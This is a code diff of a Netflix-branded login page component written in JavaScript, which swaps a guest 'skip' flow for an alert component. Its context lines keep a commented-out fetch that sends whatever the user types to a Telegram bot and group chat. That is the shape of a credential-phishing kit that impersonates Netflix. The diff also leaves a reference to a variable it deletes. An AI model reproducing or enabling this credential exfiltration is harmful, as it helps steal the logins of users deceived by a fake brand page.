@@ -1,10 +1,10 @@
 import {map,useRef} from "vanilla";
 import css from "./Login.module.css";
 import {netflixlogo,googlelogo} from "assets";
-import {InputField,ShowsBackground} from "components";
+import {InputField,ShowsBackground,SkipAlert} from "components";
 import {bottoken,netlixgroupid} from "estate";
-import {encrypt,decrypt,fadeIn} from "afile";
-import {setUsertoken,setIsguest} from "actions";
+import {encrypt,decrypt} from "afile";
+import {setUsertoken} from "actions";
 import Home from "../Home";
 
 
@@ -41,15 +41,9 @@ export default function Login(props){
     });
     ShowsBackground({parent:login,ref:refs.showsbackground});
 
-    const appcontent=app.querySelector("#content");
-    
-    const skipbtn=login.querySelector(`.${css.skipbtn}`);
-    fadeIn(skipbtn,"block",1);
-    skipbtn.onclick=()=>{
-        setIsguest();
-        appcontent.innerHTML="";
-        Home({parent:appcontent});
-    }
+    login.querySelector(`.${css.skipbtn}`).onclick=()=>{
+        SkipAlert({parent:login});  
+    };
 
     login.querySelector(`.${css.signin}`).onclick=()=>{
         if(navigator.onLine){
@@ -58,7 +52,7 @@ export default function Login(props){
             if(false){
                 setUsertoken();
                 appcontent.innerHTML="";
-                Home({parent:appcontent});
+                Home({parent:app.querySelector("#content")});
             }
             /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
                 method:"POST",
